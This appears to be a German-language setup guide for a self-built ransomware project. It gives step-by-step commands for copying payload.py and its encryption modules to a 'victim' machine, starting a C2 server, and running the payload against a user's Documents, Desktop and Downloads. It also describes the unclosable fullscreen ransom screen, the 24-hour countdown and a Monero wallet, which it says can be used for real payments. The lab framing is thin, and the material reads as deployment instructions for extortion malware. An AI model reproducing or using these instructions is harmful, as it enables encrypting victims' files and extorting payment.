# VICTIM VM SETUP - WAS MUSS HIN?

## 🎯 KURZE VERSION: Was braucht die Victim VM zum Funktionieren?

```
Victim VM Mindestanforderungen:
├─ Python 3.11+ (mit pip)
├─ cryptography Library
├─ Dateien zum Verschlüsseln (Documents, Desktop, Downloads)
└─ Netzwerkverbindung zur C2 Server IP
```

---

## 📦 SCHRITT 1: Was auf die Victim VM kopieren?

### **Minimal Setup (Absolut notwendig):**

```
C:\ransomware\
├── production/
│   └── payload.py              ← HAUPTDATEI (mit GUI eingebettet!)
├── crypt/
│   ├── __init__.py
│   ├── encryption_engine.py    ← Für Phase 1
│   └── decryption_engine.py    ← Für Phase 5
└── requirements.txt             ← Für pip install
```

### **Was du kopieren musst (genaue Dateien):**

```bash
Von Host zu Victim VM:
Copy-Item -Path "ransomware_pro\production\payload.py" -Destination "C:\ransomware\production\" -Force
Copy-Item -Path "ransomware_pro\crypt\encryption_engine.py" -Destination "C:\ransomware\crypt\" -Force
Copy-Item -Path "ransomware_pro\crypt\decryption_engine.py" -Destination "C:\ransomware\crypt\" -Force
Copy-Item -Path "ransomware_pro\crypt\__init__.py" -Destination "C:\ransomware\crypt\" -Force
Copy-Item -Path "ransomware_pro\requirements.txt" -Destination "C:\ransomware\" -Force
```

---

## 🔧 SCHRITT 2: Dependencies installieren auf Victim VM

```bash
cd C:\ransomware

# Python 3.11 muss installiert sein!
python -m pip install --upgrade pip

# Nur 1 Package notwendig:
python -m pip install cryptography

# Optional (für besseres Testing):
python -m pip install requests
```

---

## ▶️ SCHRITT 3: Payload auf Victim VM ausführen

### **Grundkommando:**
```bash
cd C:\ransomware\production

# Mit standardmäßigem C2 Server (127.0.0.1:5000):
python payload.py

# Mit custom C2 Server IP:
python payload.py --c2-host 192.168.1.100 --c2-port 5000

# Mit custom Target-Directories:
python payload.py --target-dirs "C:\Users\Victim\Documents" "C:\Users\Victim\Desktop"
```

### **Was dann passiert:**

```
Terminal Output:
═════════════════════════════════════════════════════════════
[2025-12-09 14:32:15] [INFO] Payload initialized - Ransom ID: abc123def456789
═════════════════════════════════════════════════════════════
[PHASE 1] FILE ENCRYPTION
  ├─ Scanning: C:\Users\Victim\Documents
  ├─ Scanning: C:\Users\Victim\Desktop
  ├─ Scanning: C:\Users\Victim\Downloads
  └─ [✓] Encrypted 42 files (1.5 GB)

[PHASE 2] C2 REGISTRATION
  └─ [✓] Registered successfully!

[PHASE 3] DISPLAYING PROFESSIONAL RANSOM GUI
  ├─ Backup ransom note written to: C:\Users\Victim\Desktop\README_ENCRYPTED.txt
  ├─ GUI thread started
  └─ (24-hour timer counting down...)

[PHASE 4] PAYMENT MONITORING
  ├─ GUI is monitoring for payment (5-second check interval)...
  ├─ Backend also checking every 30 seconds...
  └─ [GUI checking...]

[PHASE 5] DEPLOYING DECRYPTION KEY
  └─ (After payment detected by GUI)
```

### **GUI erscheint:**
```
┌────────────────────────────────────────────────────────┐
│ ⚠ SYSTEM COMPROMISED ⚠                                 │
├────────────────────────────────────────────────────────┤
│                                                        │
│ YOUR FILES HAVE BEEN ENCRYPTED                        │
│                                                        │
│ 23:45:30                    [Countdown Timer]          │
│                                                        │
│ RANSOM: 0.5 XMR                                       │
│ Monero: 4BJV39ZuKUhesFTWiXdKbL4NLPF7...             │
│                                                        │
│ [Scrollable Information Content]                       │
│                                                        │
│ Status: INFECTED (Waiting for payment...)             │
│                                                        │
└────────────────────────────────────────────────────────┘
```

---

## 🖥️ SETUP-VARIANTEN FÜR VICTIM VM

### **OPTION A: Schnelles Setup (wenn C2 auf localhost läuft)**

```bash
# Host Machine: C2 Server starten
cd C:\Users\Administrator\Desktop\Custom tools\ransome\ran\ransomware_pro\production
python c2_server.py
# → Listening on http://0.0.0.0:5000

# Victim VM (lokal): Payload ausführen
cd C:\ransomware\production
python payload.py
# → Verbindet zu 127.0.0.1:5000 (standard)
```

### **OPTION B: Netzwerk Setup (C2 auf separatem Host)**

```bash
# Host Machine (IP: 192.168.1.50): C2 Server starten
cd C:\Users\Administrator\Desktop\Custom tools\ransome\ran\ransomware_pro\production
python c2_server.py
# → Listening on http://0.0.0.0:5000

# Victim VM (IP: 192.168.1.100): Payload mit Host IP starten
cd C:\ransomware\production
python payload.py --c2-host 192.168.1.50 --c2-port 5000
```

### **OPTION C: VM Setup (VMware/Hyper-V)**

```bash
# Auf Victim VM:
# 1. Python 3.11 installieren
# 2. Dateien kopieren
# 3. pip install cryptography
# 4. payload.py ausführen mit korrekter Host-IP
python payload.py --c2-host 192.168.100.1 --c2-port 5000
```

---

## ✅ CHECKLIST: Was braucht die Victim VM?

- [x] **Python 3.11+** (Befehl: `python --version`)
- [x] **cryptography Library** (nach `pip install cryptography`)
- [x] **payload.py** (mit eingebetteter GUI)
- [x] **crypt/ Ordner** (encryption_engine.py + decryption_engine.py)
- [x] **Dateiordner** zum Verschlüsseln (Documents, Desktop, etc.)
- [x] **Netzwerkverbindung** zu C2 Server
- [x] **Monero Wallet** (für echte Zahlungen, optional für Tests)

---

## 🔄 KOMPLETTER ABLAUF ZUM TESTEN

### **Terminal 1: C2 Server (Host Machine)**
```bash
cd C:\Users\Administrator\Desktop\Custom tools\ransome\ran\ransomware_pro\production
python c2_server.py

# Output:
# [2025-12-09 14:30:00] [INFO] Database initialized
# [2025-12-09 14:30:01] [INFO] Listening on: http://0.0.0.0:5000
# [2025-12-09 14:30:01] [INFO] Ready for victim registration
```

### **Terminal 2: Payload (Victim VM)**
```bash
cd C:\ransomware\production
python payload.py --c2-host 192.168.1.50

# Output:
# [INFO] Payload initialized - Ransom ID: abc123def456789
# [PHASE 1] FILE ENCRYPTION
# [PHASE 2] C2 REGISTRATION
# [PHASE 3] DISPLAYING PROFESSIONAL RANSOM GUI
# [PHASE 4] PAYMENT MONITORING
```

### **Terminal 3: Payment Simulation (Host Machine)**
```bash
cd C:\Users\Administrator\Desktop\Custom tools\ransome\ran\ransomware_pro
python complete_payment_flow.py abc123def456789 4BJV39ZuKUhesFTWiXdKbL4NLPF7kMAZBHhtaQY4FqfvATNK8KSfCYVwJCa1BnKNNKJk2FwNEi4UXW6nZUZN6SZCxHt6RjdV

# Output:
# [✓] Victim registered
# [✓] Payment simulated
# ⬇️ In Terminal 2: GUI shows "PAYMENT RECEIVED!"
# ⬇️ Decryption startet automatisch
```

---

## 📊 DATEISTRUKTUR AUF VICTIM VM

```
C:\ransomware\
├── production/
│   └── payload.py (908 lines - mit eingebetteter GUI)
│
├── crypt/
│   ├── __init__.py
│   ├── encryption_engine.py (350+ lines)
│   └── decryption_engine.py (250+ lines)
│
└── requirements.txt
    └── cryptography>=41.0.0
```

---

## 🚨 WICHTIGE PUNKTE

### **Verschlüsslung:**
- ✅ AES-256 via Fernet
- ✅ PBKDF2 mit 100.000 Iterationen
- ✅ Random 16-byte Salt pro Datei
- ✅ Format: [Salt (16 bytes)] + [Encrypted Data]
- ✅ Dateiendung: .LOCKED

### **GUI Features:**
- ✅ Fullscreen & Always-on-Top
- ✅ 24-Stunden Countdown-Timer (färbt sich)
- ✅ Payment-Check alle 5 Sekunden
- ✅ Kann nicht geschlossen werden (Alt+F4 blockiert)
- ✅ Exit-Button nur 60s nach Payment

### **Netzwerk:**
- ✅ HTTP (keine HTTPS notwendig für Tests)
- ✅ Victim registriert sich beim C2 Server
- ✅ Payment-Status wird abgefragt
- ✅ Master Key wird nach Payment bereitgestellt
- ✅ Decryption Key wird angefordert und lokal used

---

## 🎯 MINIMALES TESTBEISPIEL

### **Auf Host Machine:**
```bash
# Terminal 1: C2 Server
cd C:\Users\Administrator\Desktop\Custom tools\ransome\ran\ransomware_pro\production
python c2_server.py
```

### **Auf Victim VM (oder lokal für Test):**
```bash
# Terminal 2: Payload
cd C:\ransomware\production
python payload.py

# Dann in 3. Terminal:
cd C:\Users\Administrator\Desktop\Custom tools\ransome\ran\ransomware_pro
python complete_payment_flow.py Test1 4BJV39ZuKUhesFTWiXdKbL4NLPF7kMAZBHhtaQY4FqfvATNK8KSfCYVwJCa1BnKNNKJk2FwNEi4UXW6nZUZN6SZCxHt6RjdV
```

---

## ⚙️ TROUBLESHOOTING

### **"ModuleNotFoundError: No module named 'crypt'"**
→ Sicherstellen dass `crypt/__init__.py` existiert

### **"ConnectionRefusedError: [WinError 10061]"**
→ C2 Server läuft nicht oder falsche IP/Port

### **"No module named 'cryptography'"**
→ `pip install cryptography` ausführen

### **GUI wird nicht angezeigt**
→ Tkinter ist nicht installiert (Windows Python sollte es haben)

### **Dateien werden nicht verschlüsselt**
→ Pfade müssen existieren und lesbar sein

---

## 📌 ZUSAMMENFASSUNG

**Minimum für Victim VM:**
1. Python 3.11
2. `pip install cryptography`
3. payload.py + crypt/ Ordner kopieren
4. `python payload.py --c2-host <SERVER_IP>` ausführen
5. GUI erscheint
6. Payment simulieren mit complete_payment_flow.py
7. Decryption startet automatisch

**Das ist alles! 🎯**

